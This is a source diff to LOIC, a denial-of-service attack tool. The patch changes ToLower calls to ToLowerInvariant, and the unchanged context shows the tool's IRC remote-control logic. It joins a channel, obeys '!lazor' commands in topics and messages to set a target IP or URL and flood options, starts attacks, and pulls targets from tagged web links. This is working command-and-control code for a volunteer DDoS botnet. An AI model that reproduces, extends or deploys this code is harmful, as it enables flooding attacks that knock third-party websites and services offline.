@@ -211,7 +211,7 @@ namespace LOIC
         }
         private void LockOnURL(bool silent)
         {
-            string url = txtTargetURL.Text.ToLower();
+            string url = txtTargetURL.Text.ToLowerInvariant();
             if (url.Length == 0)
             {
                 if (silent) return;
@@ -287,7 +287,7 @@ namespace LOIC
                         int port;
                         if (!int.TryParse(txtIRCport.Text, out port)) port = 6667;
                         irc.Connect(txtIRCserver.Text, port);
-                        channel = txtIRCchannel.Text.ToLower();
+                        channel = txtIRCchannel.Text.ToLowerInvariant();
                         // irc.WriteLine(Rfc2812.Nick("loicbot"),Priority.Critical);
                         // irc.WriteLine(Rfc2812.User("loic", 0, "ACSLaw"),Priority.Critical);
                         irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
@@ -396,7 +396,7 @@ namespace LOIC
         }
         void OnTopic(object sender, TopicEventArgs e)
         {
-            if (e.Channel.ToLower() == channel && e.Topic.StartsWith("!lazor "))
+            if (e.Channel.ToLowerInvariant() == channel && e.Topic.StartsWith("!lazor "))
             {
                 List<string> pars = new List<string>(e.Topic.Split(' '));
                 SetStatus("Controlled by topic");
@@ -410,7 +410,7 @@ namespace LOIC
         }
         void OnTopicChange(object sender, TopicChangeEventArgs e)
         {
-            if (e.Channel.ToLower() == channel && e.NewTopic.StartsWith("!lazor "))
+            if (e.Channel.ToLowerInvariant() == channel && e.NewTopic.StartsWith("!lazor "))
             {
                 List<string> pars = new List<string>(e.NewTopic.Split(' '));
                 SetStatus("Controlled by topic");
@@ -456,7 +456,7 @@ namespace LOIC
         }
         void OnMessage(object sender, IrcEventArgs e)
         {
-            if (e.Data.Channel.ToLower() == channel)
+            if (e.Data.Channel.ToLowerInvariant() == channel)
             {
                 if (e.Data.Message.StartsWith("!lazor "))
                 {
@@ -493,7 +493,7 @@ namespace LOIC
                     string value = sp[1];
                     int num;
                     bool isnum;
-                    switch (cmd.ToLower())
+                    switch (cmd.ToLowerInvariant())
                     {
                         case "targetip":
                             txtTargetIP.Text = value;
@@ -531,22 +531,22 @@ namespace LOIC
                             }
                             break;
                         case "wait":
-                            if (value.ToLower() == "true")
+                            if (value.ToLowerInvariant() == "true")
                             {
                                 chkResp.Checked = true;
                             }
-                            else if (value.ToLower() == "false")
+                            else if (value.ToLowerInvariant() == "false")
                             {
                                 chkResp.Checked = false;
                             }
                             break;
                         case "random":
-                            if (value.ToLower() == "true")
+                            if (value.ToLowerInvariant() == "true")
                             {
                                 chkRandom.Checked = true; //HTTP
                                 chkMsgRandom.Checked = true; //TCP_UDP
                             }
-                            else if (value.ToLower() == "false")
+                            else if (value.ToLowerInvariant() == "false")
                             {
                                 chkRandom.Checked = false; //HTTP
                                 chkMsgRandom.Checked = false; //TCP_UDP
@@ -560,21 +560,21 @@ namespace LOIC
                             }
                             break;
                         case "useget":
-                            if (value.ToLower() == "true")
+                            if (value.ToLowerInvariant() == "true")
                             {
                                 chkUseGet.Checked = true;
                             }
-                            else if (value.ToLower() == "false")
+                            else if (value.ToLowerInvariant() == "false")
                             {
                                 chkUseGet.Checked = false;
                             }
                             break;
                         case "usegzip":
-                            if (value.ToLower() == "true")
+                            if (value.ToLowerInvariant() == "true")
                             {
                                 chkUsegZip.Checked = true;
                             }
-                            else if (value.ToLower() == "false")
+                            else if (value.ToLowerInvariant() == "false")
                             {
                                 chkUsegZip.Checked = false;
                             }
@@ -590,12 +590,12 @@ namespace LOIC
                 }
                 else
                 {
-                    if (sp[0].ToLower() == "start")
+                    if (sp[0].ToLowerInvariant() == "start")
                     {
                         Attack(false, true, true);
                         return;
                     }
-                    else if (sp[0].ToLower() == "default")
+                    else if (sp[0].ToLowerInvariant() == "default")
                     {
                         txtTargetIP.Text = "";
                         txtTargetURL.Text ="";
@@ -927,7 +927,7 @@ namespace LOIC
                     tval = vals[i].Value.Trim();
                     tcmd = cmds[i].Value.Trim();
                     defaults.Remove(tcmd);
-                    switch (tcmd.ToLower())
+                    switch (tcmd.ToLowerInvariant())
                     {
                         case "targetip":
                             if (txtTargetIP.Text != tval)
@@ -1004,13 +1004,13 @@ namespace LOIC
                             }
                             break;
                         case "wait":
-                            if (tval.ToLower() == "true")
+                            if (tval.ToLowerInvariant() == "true")
                             {
                                 if (!chkResp.Checked)
                                     restart = true;
                                 chkResp.Checked = true;
                             }
-                            else if (tval.ToLower() == "false")
+                            else if (tval.ToLowerInvariant() == "false")
                             {
                                 if (chkResp.Checked)
                                     restart = true;
@@ -1018,14 +1018,14 @@ namespace LOIC
                             }
                             break;
                         case "random":
-                            if (tval.ToLower() == "true")
+                            if (tval.ToLowerInvariant() == "true")
                             {
                                 if (!chkRandom.Checked || !chkMsgRandom.Checked)
                                     restart = true;
                                 chkRandom.Checked = true; //HTTP
                                 chkMsgRandom.Checked = true; //TCP_UDP
                             }
-                            else if (tval.ToLower() == "false")
+                            else if (tval.ToLowerInvariant() == "false")
                             {
                                 if (chkRandom.Checked || chkMsgRandom.Checked)
                                     restart = true;
@@ -1083,21 +1083,21 @@ namespace LOIC
                             ret = true;
                             break;
                         case "useget":
-                            if (tval.ToLower() == "true")
+                            if (tval.ToLowerInvariant() == "true")
                             {
                                 chkUseGet.Checked = true;
                             }
-                            else if (tval.ToLower() == "false")
+                            else if (tval.ToLowerInvariant() == "false")
                             {
                                 chkUseGet.Checked = false;
                             }
                             break;
                         case "usegzip":
-                            if (tval.ToLower() == "true")
+                            if (tval.ToLowerInvariant() == "true")
                             {
                                 chkUsegZip.Checked = true;
                             }
-                            else if (tval.ToLower() == "false")
+                            else if (tval.ToLowerInvariant() == "false")
                             {
                                 chkUsegZip.Checked = false;
                             }
@@ -1249,7 +1249,7 @@ namespace LOIC
                             {
                                 if ((matches[i].Groups[8].Captures.Count > 0) && (matches[i].Groups[10].Captures.Count > 0))
                                 { // <a class="LO bu|tar r?" href="target">
-                                    if (matches[i].Groups[8].Captures[0].Value.ToLower() == "bu")
+                                    if (matches[i].Groups[8].Captures[0].Value.ToLowerInvariant() == "bu")
                                     {
                                         if (matches[i].Groups[9].Captures.Count > 0)
                                         {
@@ -1266,7 +1266,7 @@ namespace LOIC
                                             }
                                         }
                                     }
-                                    else if (matches[i].Groups[8].Captures[0].Value.ToLower() == "tar")
+                                    else if (matches[i].Groups[8].Captures[0].Value.ToLowerInvariant() == "tar")
                                     {
                                         if (getOLUrlCmd(matches[i].Groups[10].Captures[0].Value))
                                             break;
